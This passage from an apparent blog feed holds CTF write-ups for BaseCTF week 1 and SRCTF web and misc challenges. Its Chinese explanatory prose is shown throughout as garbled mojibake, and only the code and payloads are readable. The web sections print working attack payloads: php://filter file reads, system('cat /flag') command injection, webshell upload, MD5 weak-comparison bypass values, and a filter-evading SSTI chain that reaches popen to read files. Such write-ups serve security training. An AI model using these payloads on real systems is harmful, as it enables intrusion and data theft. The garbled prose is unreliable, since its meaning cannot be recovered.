class="line">åœ¨æœåŠ¡å™¨å¯¹urlè§£æè¿‡ç¨‹ä¸­http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>å’Œhttp:<span class="regexp">//</span>jasmineaura.github.io<span class="variable">@127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œ</span><br></pre></td></tr></table></figure><p>å…·ä½“åŸå› å‚è€ƒä»¥ä¸‹æ–‡ç« ï¼š<a href="https://www.freebuf.com/vuls/321535.html">https://www.freebuf.com/vuls/321535.html</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">post</span>ä¼ é€’ï¼šchallenge=<span class="keyword">http</span>://jasmineaura.github.io@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?pen=data:<span class="regexp">//</span>text/plain,Aura</span><br><span class="line">post: challenge=http:<span class="regexp">//</span>jasmineaura.github.io@<span class="number">127.0</span>.<span class="number">0.1</span>&amp;gift=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="å–µå–µå–µ"><a href="#å–µå–µå–µ" class="headerlink" title="å–µå–µå–µ"></a>å–µå–µå–µ</h3><p>æ™®é€šçš„rce</p><p>payload:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?DT=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>æ— è¿‡æ»¤æ–‡ä»¶ä¸Šä¼ </p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823140250827.png"></p><p>æ–‡ä»¶è·¯å¾„æ˜¯&#x2F;uploadsï¼Œä¸Šä¼ æˆåŠŸä¹‹åç›´æ¥è¿æ¥èšå‰‘å³å¯</p><h3 id="MD5ç»•è¿‡æ¬¸"><a href="#MD5ç»•è¿‡æ¬¸" class="headerlink" title="MD5ç»•è¿‡æ¬¸"></a>MD5ç»•è¿‡æ¬¸</h3><p>ç®€å•çš„md5ç»•è¿‡ï¼Œè´´ä¸Šæœ€å¸¸è§çš„å¼±æ¯”è¾ƒç»•è¿‡ï¼ˆ0eå¼€å¤´ï¼‰</p><p>md5å¼±ç¢°æ’</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e215962017</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?<span class="attribute">name</span>=QNKCDZO&amp;name2[]=1</span><br><span class="line">post:<span class="attribute">password</span>=s214587387a&amp;password2[]=2</span><br></pre></td></tr></table></figure><h3 id="Happy-Birthday"><a href="#Happy-Birthday" class="headerlink" title="Happy Birthday"></a>Happy Birthday</h3><p>åŸé¢˜ï¼Œä¸Šä¼ æ–‡ä»¶å‘ç°éœ€è¦pdfåç¼€ï¼Œä¸Šä¼ pdfæ–‡ä»¶å‘ç°éœ€è¦ä¸¤ä¸ªæ–‡ä»¶ä¸€èµ·ä¸Šä¼ ï¼Œå¹¶ä¸”è¦æ±‚md5å€¼ä¸€æ ·</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823150344567.png"></p><p>å°†ä¸¤ä¸ªå†™æœ‰md5å¼±æ¯”è¾ƒå­—ç¬¦ä¸²ï¼ˆmd5å¤„ç†åä»¥0eå¼€å¤´ï¼‰çš„åˆ†åˆ«å†™å…¥ä¸¤ä¸ªæ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”æ”¹å†™åç¼€ä¸ºpdfï¼Œå³å¯è·å¾—flag</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823150600204.png"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><p>basecrakå·¥å…·æ¢­å“ˆ</p><h3 id="æ ¹æœ¬è¿›ä¸å»å•Šï¼"><a href="#æ ¹æœ¬è¿›ä¸å»å•Šï¼" class="headerlink" title="æ ¹æœ¬è¿›ä¸å»å•Šï¼"></a>æ ¹æœ¬è¿›ä¸å»å•Šï¼</h3><p>ç½‘é¡µè®¿é—®ä¸äº†ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥è¯¢è¯¥åŸŸåçš„è§£æï¼Œä½¿ç”¨å¦‚ä¸‹linuxå‘½ä»¤</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dig </span>flag.<span class="keyword">basectf.fun </span>txt</span><br></pre></td></tr></table></figure><p><img src="/2024/09/04/BaseCTF_week1/image-20240823153236692.png"></p><p>ä¹Ÿå¯å€Ÿç”¨åœ¨çº¿å·¥å…·ï¼š<a href="https://tool.lu/dns/index.html">https://tool.lu/dns/index.html</a></p><h3 id="ä½ ä¹Ÿå–œæ¬¢åœ£ç‰©å—ï¼Ÿ"><a href="#ä½ ä¹Ÿå–œæ¬¢åœ£ç‰©å—ï¼Ÿ" class="headerlink" title="ä½ ä¹Ÿå–œæ¬¢åœ£ç‰©å—ï¼Ÿ"></a>ä½ ä¹Ÿå–œæ¬¢åœ£ç‰©å—ï¼Ÿ</h3><p>è§£å‹å‘ç°å‹ç¼©åŒ…éœ€è¦å¯†ç è§£å‹ï¼Œæˆ‘ä»¬å”¯ä¸€çš„ä¿¡æ¯å°±æ˜¯å›¾ç‰‡ï¼Œæ‰“å¼€010editoræŸ¥çœ‹å›¾ç‰‡æ²¡æœ‰å‘ç°æœ‰æ•ˆä¿¡æ¯ï¼Œäºæ˜¯çŒœæƒ³æ˜¯LSBå›¾ç‰‡éšå†™ï¼Œå°è¯•æœ€ç»å…¸çš„çº¢ç»¿è“ä¸‰åŸè‰²æœ€ä½ä½éšå†™ï¼Œä½¿ç”¨Stegsolveæ‰“å¼€æŸ¥çœ‹</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823154556566.png"></p><p>å¾—åˆ°</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">key</span><span class="operator">=</span>lud1_lud1</span><br></pre></td></tr></table></figure><p>è§£å‹åå‘ç°æ˜¯it is fake.zipï¼ŒçŒœæµ‹æ˜¯zipä¼ªåŠ å¯†ï¼Œä½¿ç”¨Winhexä¿®æ”¹å‹ç¼©åŒ…çš„hexç¼–ç ï¼Œå°†çº¢æ¡†ä½ç½®ä¿®æ”¹ä¸ºå¶æ•°å³å¯å°†zipä¼ªåŠ å¯†çŠ¶æ€è§£é™¤</p><img src="/2024/09/04/BaseCTF_week1/Users\ASUS\Desktop\base\img\image-20240823160459730.png" alt="image-20240823160459730" style="zoom: 80%;"><p>æœ€åä½¿ç”¨Bandizipæ‰“å¼€flag.txtï¼Œæ»šåŠ¨åˆ°æœ€ä¸‹é¢å³ä¸ºflag</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823160542649.png" alt="image-20240823160542649"></p><p>ä¸¤æ¬¡base64è§£ç å³å¯è·å¾—flag</p><h3 id="å€’è®¡æ—¶-æµ·æŠ¥"><a href="#å€’è®¡æ—¶-æµ·æŠ¥" class="headerlink" title="å€’è®¡æ—¶? æµ·æŠ¥!"></a>å€’è®¡æ—¶? æµ·æŠ¥!</h3><p>æ¯å¼ æµ·æŠ¥ä¸Šé¢éƒ½æœ‰flagçš„ä¸€æ®µï¼Œåªéœ€è¦ä»”ç»†çœ‹å°±å¯ä»¥æ‹¼å‡‘å‡ºæ¥ï¼Œè¿™é‡Œæˆ‘çœ‹ä¸å‡ºæ¥ï¼Œæ˜¯çœ‹äº†wpæ‰çŸ¥é“ç”¨pså¯¹å›¾ç‰‡è¿›è¡Œå¤„ç†ï¼Œæ–¹ä¾¿æŸ¥çœ‹</p><img src="/2024/09/04/BaseCTF_week1/image-20240823161430721.png" alt="image-20240823161430721" style="zoom: 67%;"><h3 id="æµ·ä¸Šé‡åˆ°äº†é²¨é±¼"><a href="#æµ·ä¸Šé‡åˆ°äº†é²¨é±¼" class="headerlink" title="æµ·ä¸Šé‡åˆ°äº†é²¨é±¼"></a>æµ·ä¸Šé‡åˆ°äº†é²¨é±¼</h3><p>ç”¨wiresharkæµé‡åˆ†æï¼Œè¿½è¸ªhttpæµå³å¯æ‰¾åˆ°flag</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823162538242.png"></p><p>æ‰‹æ‰“flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;15ef386b-a3a7-<span class="number">7344</span>-<span class="number">3b05</span>-ac367316fb76&#125;</span><br></pre></td></tr></table></figure><h3 id="æ­£ç€çœ‹è¿˜æ˜¯åç€çœ‹"><a href="#æ­£ç€çœ‹è¿˜æ˜¯åç€çœ‹" class="headerlink" title="æ­£ç€çœ‹è¿˜æ˜¯åç€çœ‹"></a>æ­£ç€çœ‹è¿˜æ˜¯åç€çœ‹</h3><p>é€šè¿‡010editoræ‰“å¼€æŸ¥çœ‹å›¾ç‰‡ï¼Œå‘ç°å›¾ç‰‡æ–‡ä»¶å­—èŠ‚æœ«å°¾æœ‰æ˜æ˜¾çš„JFIFç‰¹å¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹è„šæœ¬æ¥å¯¹å›¾ç‰‡æ–‡ä»¶å­—ç¬¦è¿›è¡Œé€†åºå¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_bytes_in_file</span>(<span class="params">input_file_path, output_file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">            content = infile.read()</span><br><span class="line">            reversed_content = content[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">                outfile.write(reversed_content)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æ–‡ä»¶å†…å®¹å·²æˆåŠŸé€†åºï¼Œå¹¶å†™å…¥åˆ° <span class="subst">&#123;output_file_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æœªæ‰¾åˆ°æ–‡ä»¶: <span class="subst">&#123;input_file_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å‘ç”Ÿé”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&#x27;./flag&#x27;</span> <span class="comment">#è¦å¤„ç†çš„æ–‡ä»¶å</span></span><br><span class="line">output_file = <span class="string">&#x27;./out&#x27;</span> <span class="comment">#å¤„ç†å®Œçš„æ–‡ä»¶å</span></span><br><span class="line">reverse_bytes_in_file(input_file, output_file)</span><br></pre></td></tr></table></figure><p>å¤„ç†å®Œä¹‹åçœ‹ä¸‹ç»“æœï¼Œå¯ä»¥çœ‹åˆ°å‡ºç°PKå­—èŠ‚ï¼Œæ˜æ˜¾å…·æœ‰å‹ç¼©åŒ…ç‰¹å¾</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823185638530.png"></p><p>æˆ‘ä»¬ä½¿ç”¨kaliå·¥å…·binwalkè¿›è¡Œæ–‡ä»¶åˆ†ç¦»ï¼Œå³å¯å¾—åˆ°flag</p><img src="/2024/09/04/BaseCTF_week1/image-20240823185751979.png" alt="image-20240823185751979" style="zoom:50%;"><h3 id="äºŒç»´ç 1-è¡—å¤´å°å¹¿å‘Š"><a href="#äºŒç»´ç 1-è¡—å¤´å°å¹¿å‘Š" class="headerlink" title="äºŒç»´ç 1-è¡—å¤´å°å¹¿å‘Š"></a>äºŒç»´ç 1-è¡—å¤´å°å¹¿å‘Š</h3><p>ä½¿ç”¨QR Researchæ¢­å“ˆ</p><img src="/2024/09/04/BaseCTF_week1/image-20240823201437242.png" alt="image-20240823201437242" style="zoom:67%;">]]></content>
      
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRCTF wp</title>
      <link href="/2024/08/18/SRCTF/"/>
      <url>/2024/08/18/SRCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>è€ƒå¯Ÿç®€å•çš„httpè¯·æ±‚å¤´çŸ¥è¯†ï¼Œå…·ä½“è¦æ±‚ä¸ºgetä¼ å…¥å‚æ•°flag&#x3D;1ï¼Œpostä¼ å…¥å‚æ•°flag&#x3D;1;<br>ä¼ªé€ æœ¬åœ°ipçš„æ—¶å€™å¯ä»¥åˆ©ç”¨burpsuiteçˆ†ç ´ï¼Œé¢˜ç›®ä¸‹é¢ä¼šé™„ä¸Šå­—å…¸ï¼Œè¿™é‡Œç”¨çš„æ˜¯Client-IP:127.0.0.1<br>æ¥ç€é¢˜ç›®æç¤ºåŠ å…¥User-Agent: Androidå’ŒReferer:zzz.mihoyo.com<br>æ¥ç€æ˜¯ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼Œå¦‚ä¸‹å›¾<br><img src="/2024/08/18/SRCTF/1.png" alt="å›¾ç‰‡"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">isset(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AAA&#x27;</span>]);</span><br><span class="line">//<span class="variable">$_SERVER</span>æ˜¯ä¸€ä¸ªè¶…å…¨å±€æ•°ç»„ï¼ŒåŒ…å«äº†è¯·æ±‚å¤´å’ŒæœåŠ¡å™¨ä¿¡æ¯ç­‰ä¿¡æ¯</span><br><span class="line">//<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AAA&#x27;</span>]ä»£è¡¨äº†httpè¯·æ±‚ä¸­åä¸ºAAAå¤´çš„å€¼</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä»¥ä¸Šåˆ†æï¼Œæˆ‘ä»¬åªéœ€åœ¨è¯·æ±‚ä¸­æ·»åŠ åä¸ºAAAçš„è¯·æ±‚å¤´å³å¯<img src="/2024/08/18/SRCTF/2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¥ç€æ ¹æ®æç¤ºåŠ ä¸ŠCookie:xxx&#x3D;1ï¼Œå³å¯å¾—åˆ°flag<br><img src="/2024/08/18/SRCTF/3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="flagå¤è¯»æœº"><a href="#flagå¤è¯»æœº" class="headerlink" title="flagå¤è¯»æœº"></a>flagå¤è¯»æœº</h2><p>ä¸Šæ¥ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œçœ‹åˆ°å¤§æ‹¬å·ç¬é—´å°±å¯ä»¥ååº”è¿‡æ¥æ˜¯sstiï¼Œæ‰‹æ‰“ä¸€ä¸‹ï¼Œè¿™æ˜¯æœ€ç¬¨çš„æ–¹æ³•</p><img src="/2024/08/18/SRCTF/image-20240829160846524.png" alt="image-20240829160846524" style="zoom: 67%;"><p>fuzzæµ‹æµ‹å®ƒè¿‡æ»¤äº†å•¥ï¼ˆä¸‹å›¾ä¸ºæµ‹è¯•ç»“æœï¼‰</p><img src="/2024/08/18/SRCTF/image-20240829161007052.png" alt="image-20240829161007052" style="zoom: 80%;"><p>é•¿ä¸º205çš„å…¨æ˜¯è¢«è¿‡æ»¤çš„ï¼Œçœ‹èµ·æ¥è¿‡æ»¤å¾—æŒºå¤šï¼Œä½†æ˜¯attr()å†…ç½®å‡½æ•°å’Œå•å¼•å·è¿˜æœ‰ç®¡é“ç¬¦æ²¡è¢«è¿‡æ»¤ï¼Œé‚£å°±è¯•è¯•unicodeç¼–ç ç»•è¿‡ï¼ˆè¯¥ç»•è¿‡æ–¹å¼å¯ä»¥è§£å†³è¿‡æ»¤ç‚¹å’Œä¸‹åˆ’çº¿çš„é—®é¢˜ï¼‰</p><p>é™„ä¸Šunicodeç¼–ç è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class_name = <span class="string">&quot;&quot;</span> <span class="comment">#éœ€è¦ç¼–ç çš„ç±»åå’Œæ–¹æ³•</span></span><br><span class="line">unicode_class_name = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(char)) <span class="keyword">for</span> char <span class="keyword">in</span> class_name])</span><br><span class="line"><span class="built_in">print</span>(unicode_class_name)</span><br></pre></td></tr></table></figure><p>é€ ä¸ªpaylaodï¼Œè¯•è¯•æ°´å…ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>))%&#125;</span><br><span class="line"><span class="comment">#ç›¸å½“äº&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161214569.png" alt="image-20240829161214569"></p><p>æ„é€ æˆåŠŸï¼Œè¯´æ˜æ€è·¯æ˜¯å¯¹çš„</p><p>ç»§ç»­æ„é€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>))%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005fè§£ç å‡ºæ¥å°±æ˜¯__base__</span></span><br><span class="line"><span class="comment">#æ•´ä¸ªpaylaodç›¸å½“äº&#123;&#123;&quot;&quot;.__class__.__base__&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161315769.png" alt="image-20240829161315769"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)())%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#|attr(&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;)(0)ç›¸å½“äº.__base__[0]</span></span><br><span class="line"><span class="comment">#attr(&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;)()ç›¸å½“äº.__subclasses__()</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161416177.png" alt="image-20240829161416177"></p><p>é€šè¿‡è„šæœ¬(æœ¬é¢˜åé¢ä¼šè´´ä¸Špythonæ‰¾ç±»è„šæœ¬)æ‰¾åˆ°&lt;os._wrap_close&gt;ç±»åœ¨137çš„ä½ç½®ä¸Šï¼Œç»§ç»­æ„é€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>))%&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161559785.png" alt="image-20240829161559785"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>((()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;\u006c\u0073\u0020\u002f&#x27;</span>))[<span class="string">&#x27;read&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161621737.png" alt="image-20240829161621737"></p><p>æœ€ç»ˆpayloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>((()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&#x27;</span>))[<span class="string">&#x27;read&#x27;</span>]())%&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#|attr(&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;)(&#x27;po&#x27;&#x27;pen&#x27;)(&#x27;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&#x27;))[&#x27;read&#x27;]()ç›¸å½“äº.__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()</span></span><br><span class="line"><span class="comment">#popenè¢«è¿‡æ»¤ï¼Œå¯ç”¨&#x27;po&#x27;&#x27;open&#x27;ç»•è¿‡</span></span><br><span class="line"><span class="comment">#åŒæ—¶/è¢«è¿‡æ»¤ï¼Œå°†å‘½ä»¤cat /flagç¼–ç ç»•è¿‡</span></span><br><span class="line"><span class="comment">#ç”±äºç‚¹è¢«è¿‡æ»¤.read()æ–¹æ³•æ— æ³•è¡¨è¾¾ï¼Œç”¨()å°†.readæ–¹æ³•åŒ…æ‹¬çš„èŒƒå›´è£…åœ¨ä¸€èµ·ï¼Œå¹¶ä¸”é€šè¿‡[&#x27;read&#x27;]ç»•è¿‡å¯¹</span></span><br><span class="line">ç‚¹çš„è¿‡æ»¤ï¼Œå³a[<span class="string">&#x27;read&#x27;</span>]()ç­‰æ•ˆä¸ºa.read()</span><br></pre></td></tr></table></figure><p>sstiæ‰¾ç±»è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ç±».txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    a = file.read().strip()</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">allList = []</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result += i</span><br><span class="line">        allList.append(result)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> i == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += i</span><br><span class="line"></span><br><span class="line"><span 